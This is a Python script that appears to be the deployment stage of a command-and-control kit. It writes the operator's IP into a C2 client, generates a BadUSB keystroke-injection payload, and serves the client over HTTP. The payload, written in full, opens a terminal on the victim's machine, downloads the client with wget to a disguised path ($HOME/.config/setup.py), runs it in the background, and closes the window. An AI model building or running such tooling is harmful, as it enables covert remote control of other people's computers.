import os
import socket
import socketserver
import re
import http.server
import subprocess
import shutil
import sys

# Step 1: Replace IP_HOST in client.py with your local IP address
client_py_path = os.path.join(os.path.dirname(__file__), "Base-C2/client.py")

# Get your local IP address by parsing ifconfig output

def get_local_ip():
    ifconfig_output = subprocess.check_output("ifconfig", shell=True).decode("utf-8")
    match = re.search(r'192\.168\.\d+\.\d+', ifconfig_output)
    if match:
        return match.group(0)
    else:
        raise RuntimeError("Local IP address not found in ifconfig output")

local_ip = get_local_ip()

shutil.copyfile(client_py_path, os.path.join(os.path.dirname(__file__), "client_r.py"))
client_py_path = os.path.join(os.path.dirname(__file__), "client_r.py")
# Read and replace IP_HOST in client.py
with open(client_py_path, "r") as f:
    content = f.read()

content_new = re.sub(r'IP_HOST', f'"{local_ip}"', content)

with open(client_py_path, "w") as f:
    f.write(content_new)

# change the payload of the badusb
badusb_payload = f"""DEFAULT_DELAY 1
GUI
DELAY 300
STRING terminal
DELAY 300
ENTER
DELAY 1000
STRING (wget http://{local_ip}:8000/client_r.py -O $HOME/.config/setup.py && python3 $HOME/.config/setup.py) & disown; exit
ENTER
"""

print(badusb_payload)
# take first argument as the USB mount path
if len(sys.argv) < 2:
    raise RuntimeError("Please provide the USB mount path as the first argument")

usb_mount_path = sys.argv[1]
# check if the usb is mounted
if not os.path.exists(usb_mount_path):
    raise RuntimeError(f"USB drive not found at {usb_mount_path}. Please ensure it is mounted.")

# Write the badusb payload to the USB drive
badusb_file_path = os.path.join(usb_mount_path, "payload.dd")
with open(badusb_file_path, "w") as f:
    f.write(badusb_payload)

# umount the USB drive
#subprocess.run(["umount", usb_mount_path], check=True)
subprocess.run(["umount", usb_mount_path], check=True)  # Ensure all writes are flushed to disk
print(f"BadUSB payload written to {badusb_file_path}. Please safely remove the USB drive.")
# Step 2: Serve only client.py via HTTP
class SingleFileHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def list_directory(self, path):
        self.send_error(403, "Directory listing not allowed")
        return None

    def do_GET(self):
        if self.path == "/client_r.py":
            super().do_GET()
            print("File retrieved, shutting down server...\n\n\n")
            # Shut down the server
            exit(0)
        else:
            self.send_error(404, "File not found")

if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    PORT = 8000
    Handler = SingleFileHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Serving client_r.py at http://{local_ip}:{PORT}/client_r.py\n")
        httpd.serve_forever()
